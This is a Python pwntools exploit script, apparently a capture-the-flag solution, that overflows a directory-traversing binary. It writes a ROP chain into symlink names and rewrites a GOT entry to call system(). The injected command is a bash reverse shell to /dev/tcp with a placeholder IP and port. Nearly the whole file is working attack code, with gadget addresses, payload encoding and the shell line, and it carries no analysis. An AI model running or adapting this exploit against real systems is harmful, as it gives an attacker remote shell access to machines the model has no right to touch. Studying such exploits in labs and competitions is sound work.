#!/usr/bin/env python3

import os, sys
from pwn import *

context.arch = 'amd64'

def find_null(b):
    for i, bb in enumerate(b):
        if bb == 0:
            yield i

def bytes_to_echo(b):
    cmd = "$(/usr/bin/echo -en '"
    hx = b.hex()
    for i in range(len(b)):
        cmd += '\\x'+hx[i*2:(i+1)*2]
    cmd += "')"
    return cmd

def rop_to_symlink(rop, dirr, in_dir):
    dir_order = [int(x) for x in open('dir_order.txt').read().strip().split('\n')]
    null_idx = list(find_null(rop))[::-1]
    no_null_rop = rop.replace(b'\x00', b'a')
    echo = bytes_to_echo(no_null_rop)
    os.system(f'rm -r {dirr}/*')
    os.system(f'mkdir -p {dirr}{in_dir}')
    ln = f'ln -s "{echo}" {dirr}{in_dir}/{dir_order[0]}'
    os.system(ln)
    e = 1
    for i in null_idx:
        echo = bytes_to_echo(no_null_rop[:i])
        ln = f'ln -s "{echo}" {dirr}{in_dir}/{dir_order[e]}'
        os.system(ln)
        e += 1


overflow_off = 530

buf = 0x405000
buf2 = 0x405410
buf3 = 0x405d10
buf_str = 0x405e10
buf_str2 = 0x405e80
got = 0x404fe8

pop_rdi = 0x402113
pop_rbp = 0x40141d
pop_rsi_r15 = 0x402111
pop_rsp_r13_r14_r15 = 0x40210d
pop_rbx_rbp_r12_r13_r14_r15 = 0x40210a
leave_ret = 0x401459
ret = 0x40101a
add_dword_rbp_0x3d_ebx = 0x40141c
libc_csu_init = 0x4020b0
traverse_dir = 0x4019dc

def write_dst_src_dword(dst, src, use_ff=1):
    ret = b''
    if use_ff:
        ff = 0xffffffffffffffff
    else:
        ff = 0
    assert len(src)%4 == 0
    done = [0 for x in src]
    for i in range(0, len(src), 4):
        op = u32(src[i:i+4])
        if done[i] or not op: continue
        ret += flat([
            pop_rbx_rbp_r12_r13_r14_r15, op, dst+0x3d+i, [ff]*4,
            add_dword_rbp_0x3d_ebx,
        ])
        for j in range(i+4, len(src), 4):
            op2 = u32(src[j:j+4])
            if not done[j] and op2 == op:
                ret += flat([
                    pop_rbp, dst+0x3d+j,
                    add_dword_rbp_0x3d_ebx,
                ])
                done[j] = 1
    return ret


ff = 0xffffffffffffffff
ee = 0xeeeeeeeeeeeeeeee
dd = 0xdddddddddddddddd
mask = 0xffffffffffff00ff

# rop2 has limited length due to linux filename's length limit
rop2_1 = flat([
    pop_rbp, buf3,
    leave_ret,
])

system = 0x52290
libc_start_main = 0x23f90
def list_to_bytes(l):
    b = b''
    for c in l:
        b += c.to_bytes(1, 'big')
    return b

cmd = b'/bin/bash -c "bash -l > /dev/tcp/[ip]/[port] 0<&1 2>&1"'
pad = len(cmd)%4
cmd += b'\x00'*(4-pad)
cmd2 = list_to_bytes([1 if x == ord('/') else 0 for x in cmd])
print(cmd2)
cmd = cmd.replace(b'/', b'.')

rop2_2 = flat([
    libc_csu_init,
    write_dst_src_dword(buf3, p32(system-libc_start_main), use_ff=0),
    pop_rdi, buf_str2,
    pop_rbp, buf3-8,
    leave_ret,
])

rop2 = flat([
    'a'*overflow_off,
    write_dst_src_dword(buf, rop2_1),
    write_dst_src_dword(buf3+8, rop2_2),
    write_dst_src_dword(buf_str2, cmd),
    write_dst_src_dword(buf_str2, cmd2),
    pop_rsp_r13_r14_r15, got,
])

rop_to_symlink(rop2, sys.argv[1]+'/exploit89', '/89'*10)

